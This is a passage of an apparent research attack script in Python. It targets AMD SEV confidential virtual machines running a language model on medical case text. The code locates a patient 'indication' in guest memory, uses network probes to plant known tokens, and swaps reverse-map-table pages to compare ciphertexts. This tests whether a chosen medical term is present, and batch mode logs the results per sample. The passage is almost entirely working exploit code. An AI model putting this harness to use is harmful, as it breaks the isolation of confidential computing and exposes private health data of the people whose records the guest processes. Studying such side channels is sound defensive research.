    # ── all-matching batch mode ───────────────────────────────────────────────
    if args.all_matching:
        indices = scan_matching_indices(args.token_idx, args.guest_dataset)
        if not indices:
            print("[!] No matching samples. Exiting.")
            sys.exit(0)
        for idx in indices:
            print(f"\n{'='*60}")
            print(f"[batch] index={idx}  token_idx={args.token_idx}")
            args.current_index = idx
            indication_gpa, guest_proc = acquire_indication_gpa(
                idx, args.guest_script, args.guest_cwd, args.guest_python,
                swap_tool=args.swap_tool)
            if indication_gpa is None:
                print(f"[!] index={idx} skipped")
                continue
            try:
                _run_single_attack(args, indication_gpa, guest_proc)
            except SystemExit as e:
                if e.code != 0:
                    print(f"[!] index={idx} failed (exit {e.code}), continuing...",
                          file=sys.stderr)
                try:
                    guest_proc.stdin.close()
                    guest_proc.wait(timeout=10)
                except Exception:
                    pass
            time.sleep(5)   # brief pause between samples
        return

    # ── single-sample: acquire indication_gpa ────────────────────────────────
    guest_proc = None
    if args.index is not None:
        if args.indication_gpa is not None:
            print("[!] --index and --indication-gpa are mutually exclusive.", file=sys.stderr)
            sys.exit(1)
        args.current_index = args.index
        print(f"\n[auto] index={args.index} → acquiring Indication GPA from guest...")
        indication_gpa, guest_proc = acquire_indication_gpa(
            args.index, args.guest_script, args.guest_cwd, args.guest_python,
            swap_tool=args.swap_tool)
        if indication_gpa is None:
            sys.exit(1)
    elif args.indication_gpa is not None:
        indication_gpa = int(args.indication_gpa, 16)
    else:
        print("[!] One of --indication-gpa or --index is required.", file=sys.stderr)
        sys.exit(1)

    _run_single_attack(args, indication_gpa, guest_proc)


def _run_single_attack(args, indication_gpa: int, guest_proc) -> None:
    cp_out  = Path(args.cp_out)
    gpa_out = Path(args.gpa_out)

    print("=" * 60)
    print(f"indication_gpa (raw) = 0x{indication_gpa:x}")

    # When the indication contains multiple phrases (e.g. "3-year-old female with shortness of breath.")
    # use the guest tokenizer to find the exact byte offset of the target token and adjust indication_gpa.
    if getattr(args, 'guest_model_path', None) and hasattr(args, 'current_index'):
        label_text, target_ids_list = TOKEN_LABELS[args.token_idx]
        indication_text = get_indication_text(args.current_index,
                                              getattr(args, 'guest_dataset',
                                                      GUEST_DATASET_DEFAULT))
        if indication_text:
            print(f"  [tokenizer] indication = '{indication_text}'")
            # Fast path: indication starts with the target label at a word boundary.
            # Check next char to avoid "Coughing".startswith("cough") false-positive.
            next_char = indication_text[len(label_text)] if indication_text.startswith(label_text) and len(indication_text) > len(label_text) else ""
            at_word_boundary = indication_text.startswith(label_text) and (not next_char or next_char in " ,.")
            if at_word_boundary:
                byte_offset = 0
                print(f"  [tokenizer] target at start of indication — no adjustment needed (fast path)")
            else:
                byte_offset = find_target_token_offset(
                    indication_text, target_ids_list,
                    args.guest_model_path,
                    getattr(args, 'guest_python', GUEST_PYTHON_DEFAULT))
            if byte_offset > 0:
                print(f"  [tokenizer] target tokens at byte +{byte_offset} within indication")
                indication_gpa += byte_offset
                print(f"  [tokenizer] adjusted indication_gpa = 0x{indication_gpa:x}")
            elif byte_offset == 0:
                if not indication_text.lower().startswith(label_text.lower()):
                    print(f"  [tokenizer] target tokens at start of indication — no adjustment needed")
            else:
                print(f"  [tokenizer] target tokens not found in indication — using raw GPA",
                      file=sys.stderr)

    indication_page_gpa = indication_gpa & ~0xFFF
    token_offset = indication_gpa & 0xFFF
    print(f"indication_page_gpa = 0x{indication_page_gpa:x}")
    print(f"token_offset        = 0x{token_offset:x}")

    if args.try_all_phases:
        if not args.token_ids:
            print("[!] --token-ids required with --try-all-phases", file=sys.stderr)
        else:
            try_all_phases(
                token_idx           = args.token_idx,
                indication_page_gpa = indication_page_gpa,
                token_offset        = token_offset,
                token_ids           = args.token_ids,
                swap_tool           = args.swap_tool,
            )
        if guest_proc is not None:
            guest_proc.stdin.close()
            guest_proc.wait()
        return

    print("\n[1/4] Acquire GPA_token")
    if args.token_gpa:
        token_gpa = int(args.token_gpa, 16)
        frag_p1 = 970  # can't determine dynamically with user-provided GPA
        args.prefix = token_offset + frag_p1
        print(f"  GPA_token = 0x{token_gpa:x}  (user-provided)")
    else:
        # Send two probes to dynamically measure the actual ring-advance-per-packet.
        # Background traffic (SSH, etc.) during batch runs can consume extra ring slots,
        # making the fixed-512 assumption wrong (measured excess: 1536–2048 bytes).
        print("  [probe1] Sending first probe with prefix=0...")
        _, frag_p1_a = acquire_token_gpa(args.token_idx, prefix=0)
        print("  [probe2] Sending second probe with prefix=0 (measuring inter-probe delta)...")
        _, frag_p1_b = acquire_token_gpa(args.token_idx, prefix=0)
        PROBE_FRAG_DELTA = (frag_p1_a - frag_p1_b) % 4096
        frag_p1 = frag_p1_b  # last probe reflects state immediately before actual send
        expected_actual_frag_p1 = frag_p1 - PROBE_FRAG_DELTA
        if expected_actual_frag_p1 < 0:
            expected_actual_frag_p1 += 4096
        args.prefix = token_offset + expected_actual_frag_p1
        print(f"  probe1 frag_p1         = {frag_p1_a}")
        print(f"  probe2 frag_p1         = {frag_p1_b}")
        print(f"  PROBE_FRAG_DELTA       = {PROBE_FRAG_DELTA}  (dynamically measured)")
        print(f"  expected_actual_frag_p1= {expected_actual_frag_p1}  (probe2 − {PROBE_FRAG_DELTA})")
        print(f"  prefix (corrected)     = {args.prefix}")
        # Actual send: retransmit with the corrected prefix (payload auto-extended by send_tokens.py)
        token_gpa, actual_frag_p1 = acquire_token_gpa(args.token_idx, prefix=args.prefix)
        actual_landing = args.prefix - actual_frag_p1
        if actual_landing == token_offset:
            print(f"  frag_p1 actual={actual_frag_p1} → token at 0x{actual_landing:x} ✓")
        else:
            print(f"  [!] frag_p1 actual={actual_frag_p1} → token at 0x{actual_landing:x} "
                  f"(target 0x{token_offset:x}, error {actual_landing - token_offset:+d}) ← MISMATCH expected",
                  file=sys.stderr)

    print(f"  indication_gpa = 0x{indication_gpa:x}")
    print(f"  token_gpa      = 0x{token_gpa:x}")

    print(f"\n[2/4] Pre-swap dump: GPA_token → {cp_out.name}")
    run("read_gpa (before)", [sys.executable, str(READ_GPA), "cp", f"0x{token_gpa:x}"])

    print(f"\n[3/4] Atomic swap+copy+swap-back: 0x{token_gpa:x} ↔ 0x{indication_page_gpa:x}")
    do_swap_and_read(args.swap_tool, token_gpa, indication_page_gpa, gpa_out)
    # Guest never sees swapped RMP state — no SEV_TERM risk, no manual swap-back needed.

    print(f"\n[4/4] Compare: {cp_out.name} vs {gpa_out.name}")
    verdict = "ERROR"
    matched_chunks = []
    if args.token_ids:
        r = subprocess.run([
            sys.executable, str(VERIFY), "verify",
            "--cp",           str(cp_out),
            "--post",         str(gpa_out),
            "--token-offset", hex(token_offset),
            "--token-ids",    args.token_ids,
        ], capture_output=True, text=True)
        print(r.stdout, end="")
        if r.stderr:
            print(r.stderr, end="", file=sys.stderr)
        if "MATCH ✓" in r.stdout:
            verdict = "MATCH"
            lines = r.stdout.splitlines()
            for i, line in enumerate(lines):
                if "MATCH ✓" in line and "+0x" in line:
                    for j in range(i + 1, min(i + 3, len(lines))):
                        m = re.match(r'\s+cp\s*:\s+([0-9a-f]+)', lines[j])
                        if m:
                            matched_chunks.append(m.group(1))
                            break
        elif "MISMATCH" in r.stdout:
            verdict = "MISMATCH"
    else:
        print("  [!] --token-ids not specified → full comparison via token_find.py")
        subprocess.run([sys.executable, str(TOKEN_FIND), str(cp_out), str(gpa_out)])

    _save_result(args, indication_gpa, verdict, matched_chunks)

    print("\nDone.")
    print(f"  cp.out  = pre-swap  ciphertext at GPA_token (0x{token_gpa:x})")
    print(f"  gpa.out = post-swap ciphertext from kernel buffer (atomic --swap-back)")

    if guest_proc is not None:
        guest_proc.stdin.close()
        guest_proc.wait()


def _save_result(args, indication_gpa: int, verdict: str,
                 matched_chunks: list = None) -> None:
    label, ids = TOKEN_LABELS[args.token_idx]
    csv_path = Path(str(RESULTS_CSV_TMPL).format(args.token_idx))
    row = {
        "timestamp":      datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S"),
        "index":          getattr(args, "current_index", "-"),
        "token_idx":      args.token_idx,
        "token_label":    label,
        "token_ids":      args.token_ids,
        "indication_gpa": f"0x{indication_gpa:x}",
        "verdict":        verdict,
        "matched_chunks": ";".join(matched_chunks) if matched_chunks else "",
    }
    write_header = not csv_path.exists()
    with open(csv_path, "a", newline="") as f:
        w = csv.DictWriter(f, fieldnames=list(row.keys()))
        if write_header:
            w.writeheader()
        w.writerow(row)
    print(f"  → result saved: {csv_path}  [{verdict}]")


if __name__ == "__main__":
    main()
